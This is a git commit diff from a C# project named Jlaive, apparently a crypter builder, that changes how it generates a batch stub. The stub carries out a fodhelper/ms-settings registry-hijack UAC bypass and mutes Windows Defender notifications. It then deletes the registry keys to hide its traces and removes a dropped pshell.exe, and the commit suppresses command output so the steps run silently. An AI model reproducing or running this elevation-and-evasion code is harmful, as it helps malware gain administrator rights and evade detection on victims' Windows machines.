8bfa13afed219f31dfd9b2798a38bc9c7af5ab44
chash <70506265+ch2sh@users.noreply.github.com>
2022-05-12 18:25:54 +0800

    UAC bypass fix #2

--- Jlaive/Form1.cs
+++ Jlaive/Form1.cs
@@ -75,13 +75,14 @@ namespace Jlaive
             toobf.AppendLine("cls");
             if (bypassUAC.Checked)
             {
-                toobf.AppendLine(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f");
+                toobf.AppendLine(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f >nul");
                 toobf.AppendLine(@"cmd /c reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d %p% /f");
                 toobf.AppendLine("fodhelper");
-                toobf.AppendLine(@"reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f");
-                toobf.AppendLine(@"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f");
+                toobf.AppendLine(@"reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f >nul");
+                toobf.AppendLine(@"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f >nul");
             }
             else toobf.AppendLine(command);
+            toobf.AppendLine("powershell -noprofile -executionpolicy bypass -command while ([System.Diagnostics.Process]::GetProcessesByName('pshell').Length -gt 0) { start-sleep 1; }");
             toobf.Append("del pshell.exe");
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
